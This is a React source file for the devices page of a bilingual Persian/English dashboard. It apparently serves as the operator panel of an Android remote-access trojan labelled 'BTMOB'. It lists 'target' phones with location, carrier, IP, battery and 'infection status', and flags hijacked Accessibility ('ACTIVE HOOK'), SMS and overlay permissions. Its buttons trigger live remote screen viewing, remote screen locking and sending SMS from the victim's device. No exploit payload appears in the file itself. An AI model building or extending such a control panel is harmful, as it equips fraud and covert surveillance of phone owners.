import React, { useState } from 'react';
import { useDashboard } from '../../context/DashboardContext';
import { 
  Smartphone, 
  Search, 
  Lock, 
  Unlock, 
  ScreenShare, 
  ShieldAlert, 
  ShieldCheck, 
  BatteryCharging, 
  Eye, 
  MessageSquare,
  Radio,
  SlidersHorizontal
} from 'lucide-react';
import { t } from '../../utils/translations';
import { Device } from '../../types';

export const DevicesView: React.FC = () => {
  const { 
    lang, 
    devices, 
    setSelectedDeviceId, 
    setSelectedInspectDevice,
    setActiveTab, 
    toggleScreenLock, 
    quarantineDevice,
    setIsSendSmsOpen 
  } = useDashboard();

  const labels = t[lang];
  const [searchQuery, setSearchQuery] = useState('');
  const [statusFilter, setStatusFilter] = useState<'all' | 'online' | 'offline' | 'quarantined'>('all');
  const [osFilter, setOsFilter] = useState<string>('all');

  const filteredDevices = devices.filter(d => {
    const matchesSearch = 
      d.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      d.id.toLowerCase().includes(searchQuery.toLowerCase()) ||
      d.carrier.toLowerCase().includes(searchQuery.toLowerCase()) ||
      d.city.toLowerCase().includes(searchQuery.toLowerCase()) ||
      d.country.toLowerCase().includes(searchQuery.toLowerCase()) ||
      d.ip.includes(searchQuery);

    const matchesStatus = statusFilter === 'all' || d.status === statusFilter;
    const matchesOs = osFilter === 'all' || d.androidVersion.toLowerCase().includes(osFilter.toLowerCase());

    return matchesSearch && matchesStatus && matchesOs;
  });

  return (
    <div className="space-y-6">
      {/* Title & Context */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 border-b border-slate-800/60 pb-4">
        <div>
          <h1 className="text-xl font-bold tracking-tight text-white">
            {labels.navDevices}
          </h1>
          <p className="text-xs text-slate-400 mt-1">
            {lang === 'fa' 
              ? 'مدیریت ناوگان دیوایس‌های هدف، سطوح دسترسی Accessibility، قفل ریموت و وضعیت آلودگی' 
              : 'Target mobile fleet administration, accessibility privilege audit, screen locks, and telemetry'}
          </p>
        </div>

        <div className="flex items-center gap-2">
          <span className="text-xs text-slate-400 font-mono">
            {filteredDevices.length} / {devices.length} {lang === 'fa' ? 'دستگاه' : 'devices'}
          </span>
        </div>
      </div>

      {/* Filter and Search Bar (Single-line controls, functional segmented buttons) */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 bg-slate-900/40 p-3 rounded-xl border border-slate-800/80">
        {/* Search Input */}
        <div className="relative flex-1 max-w-md">
          <Search className="w-4 h-4 text-slate-500 absolute start-3 top-1/2 -translate-y-1/2" />
          <input
            type="text"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder={lang === 'fa' ? 'جستجو براساس نام، مدل، آی‌پی، شهر یا اپراتور...' : 'Search by name, model, IP, city or carrier...'}
            className="w-full bg-slate-950 border border-slate-800 rounded-lg ps-9 pe-3 py-2 text-xs text-slate-200 placeholder-slate-500 outline-none focus:border-cyan-500"
          />
        </div>

        {/* Filter Buttons */}
        <div className="flex flex-wrap items-center gap-2">
          {/* Status Filter Segmented Control */}
          <div className="flex items-center bg-slate-950 rounded-lg p-1 border border-slate-800">
            <button
              onClick={() => setStatusFilter('all')}
              className={`px-3 py-1 text-xs rounded-md font-medium transition-colors cursor-pointer ${
                statusFilter === 'all' ? 'bg-slate-800 text-white' : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              {lang === 'fa' ? 'همه' : 'All'}
            </button>
            <button
              onClick={() => setStatusFilter('online')}
              className={`px-3 py-1 text-xs rounded-md font-medium transition-colors cursor-pointer ${
                statusFilter === 'online' ? 'bg-emerald-950/70 text-emerald-300 border border-emerald-800/40' : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              {lang === 'fa' ? 'آنلاین' : 'Online'}
            </button>
            <button
              onClick={() => setStatusFilter('quarantined')}
              className={`px-3 py-1 text-xs rounded-md font-medium transition-colors cursor-pointer ${
                statusFilter === 'quarantined' ? 'bg-amber-950/70 text-amber-300 border border-amber-800/40' : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              {lang === 'fa' ? 'قرنطینه' : 'Quarantined'}
            </button>
          </div>

          {/* OS Filter Dropdown */}
          <select
            aria-label="Android OS Filter"
            value={osFilter}
            onChange={(e) => setOsFilter(e.target.value)}
            className="bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs text-slate-300 outline-none focus:border-cyan-500 cursor-pointer font-mono"
          >
            <option value="all">{lang === 'fa' ? 'همه نسخه‌های اندروید' : 'All Android OS'}</option>
            <option value="14">Android 14</option>
            <option value="13">Android 13</option>
          </select>
        </div>
      </div>

      {/* Main Devices Table */}
      <div className="rounded-xl bg-slate-900/60 border border-slate-800/80 overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-xs text-start">
            <thead>
              <tr className="border-b border-slate-800 bg-slate-950/60 text-slate-400 text-[11px]">
                <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'دستگاه و شناسه' : 'Device & ID'}</th>
                <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'نسخه OS و API' : 'Android OS'}</th>
                <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'موقعیت و اپراتور' : 'Location & Carrier'}</th>
                <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'باتری و اتصال' : 'Battery & Status'}</th>
                <th className="py-3 px-4 font-medium text-start">{lang === 'fa' ? 'دسترسی‌های فعال' : 'Privileges (BTMOB)'}</th>
                <th className="py-3 px-4 font-medium text-end">{lang === 'fa' ? 'کنترل ریموت' : 'Remote Management'}</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/50">
              {filteredDevices.length === 0 ? (
                <tr>
                  <td colSpan={6} className="py-8 text-center text-slate-500">
                    {lang === 'fa' ? 'هیچ دستگاهی با این فیلتر یافت نشد' : 'No devices found matching filter criteria'}
                  </td>
                </tr>
              ) : (
                filteredDevices.map((d) => (
                  <tr key={d.id} className="hover:bg-slate-800/25 transition-colors">
                    {/* Device info */}
                    <td className="py-3.5 px-4">
                      <div className="flex items-center gap-3">
                        <div className="w-8 h-8 rounded-lg bg-slate-800/80 border border-slate-700/60 flex items-center justify-center text-slate-300">
                          <Smartphone className="w-4 h-4" />
                        </div>
                        <div>
                          <div className="font-semibold text-slate-200">{d.name}</div>
                          <div className="text-[10px] text-slate-400 font-mono">{d.id} · {d.model}</div>
                        </div>
                      </div>
                    </td>

                    {/* Android Version */}
                    <td className="py-3.5 px-4">
                      <div className="font-mono text-slate-300">{d.androidVersion}</div>
                      <div className="text-[10px] text-slate-500 font-mono">API Level {d.apiLevel}</div>
                    </td>

                    {/* Location & Carrier */}
                    <td className="py-3.5 px-4">
                      <div className="text-slate-200">{d.city} ({d.country})</div>
                      <div className="text-[10px] text-slate-400 font-mono">{d.carrier} · {d.ip}</div>
                    </td>

                    {/* Battery & Status */}
                    <td className="py-3.5 px-4">
                      <div className="flex items-center gap-1.5 font-mono text-[11px] text-slate-300 mb-1">
                        <BatteryCharging className="w-3.5 h-3.5 text-cyan-400" />
                        <span>{d.battery}%</span>
                      </div>
                      <span className={`inline-flex items-center gap-1 text-[11px] font-mono capitalize ${
                        d.status === 'online' ? 'text-emerald-400' : d.status === 'quarantined' ? 'text-amber-400' : 'text-slate-400'
                      }`}>
                        <span className={`w-1.5 h-1.5 rounded-full ${d.status === 'online' ? 'bg-emerald-400 animate-pulse' : d.status === 'quarantined' ? 'bg-amber-400' : 'bg-slate-500'}`} />
                        {d.status}
                      </span>
                    </td>

                    {/* Privileges Matrix (Clean unboxed text) */}
                    <td className="py-3.5 px-4">
                      <div className="space-y-0.5 text-[11px]">
                        <div className="flex items-center gap-1.5">
                          <span className="text-slate-400">Accessibility:</span>
                          <span className={`font-mono ${d.accessibilityEnabled ? 'text-rose-400 font-medium' : 'text-slate-500'}`}>
                            {d.accessibilityEnabled ? 'ACTIVE HOOK' : 'OFF'}
                          </span>
                        </div>
                        <div className="flex items-center gap-1.5 text-[10px] text-slate-400 font-mono">
                          <span>SMS: {d.smsPermission ? 'YES' : 'NO'}</span>
                          <span aria-hidden="true">·</span>
                          <span>OVERLAY: {d.overlayPermission ? 'YES' : 'NO'}</span>
                        </div>
                      </div>
                    </td>

                    {/* Action buttons */}
                    <td className="py-3.5 px-4 text-end">
                      <div className="flex items-center justify-end gap-1.5">
                        {/* Remote screen */}
                        <button
                          onClick={() => {
                            setSelectedDeviceId(d.id);
                            setActiveTab('remote-screen');
                          }}
                          className="p-1.5 rounded-lg bg-cyan-950/60 border border-cyan-800/50 text-cyan-300 hover:bg-cyan-900/60 transition-colors cursor-pointer"
                          title={lang === 'fa' ? 'مشاهده و کنترل صفحه نمایش زنده' : 'View live screen'}
                        >
                          <ScreenShare className="w-3.5 h-3.5" />
                        </button>

                        {/* Lock / Unlock */}
                        <button
                          onClick={() => toggleScreenLock(d.id)}
                          className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 transition-colors cursor-pointer"
                          title={d.screenLocked ? (lang === 'fa' ? 'بازکردن قفل' : 'Unlock') : (lang === 'fa' ? 'قفل صفحه' : 'Lock')}
                        >
                          {d.screenLocked ? (
                            <Unlock className="w-3.5 h-3.5 text-amber-400" />
                          ) : (
                            <Lock className="w-3.5 h-3.5 text-slate-400" />
                          )}
                        </button>

                        {/* Send SMS from this device */}
                        <button
                          onClick={() => {
                            setSelectedDeviceId(d.id);
                            setIsSendSmsOpen(true);
                          }}
                          className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 transition-colors cursor-pointer"
                          title={lang === 'fa' ? 'ارسال پیامک با این دیوایس' : 'Send SMS via device'}
                        >
                          <MessageSquare className="w-3.5 h-3.5" />
                        </button>

                        {/* Inspect details */}
                        <button
                          onClick={() => setSelectedInspectDevice(d)}
                          className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 transition-colors cursor-pointer"
                          title={lang === 'fa' ? 'جزئیات کامل دستگاه' : 'Deep inspect'}
                        >
                          <Eye className="w-3.5 h-3.5" />
                        </button>

                        {/* Quarantine toggle */}
                        <button
                          onClick={() => quarantineDevice(d.id)}
                          className={`p-1.5 rounded-lg transition-colors cursor-pointer ${
                            d.status === 'quarantined'
                              ? 'bg-emerald-950 border border-emerald-800 text-emerald-400 hover:bg-emerald-900'
                              : 'bg-rose-950 border border-rose-800 text-rose-400 hover:bg-rose-900'
                          }`}
                          title={d.status === 'quarantined' ? (lang === 'fa' ? 'رفع قرنطینه' : 'Unquarantine') : (lang === 'fa' ? 'قرنطینه امنیتی' : 'Quarantine')}
                        >
                          <ShieldAlert className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};
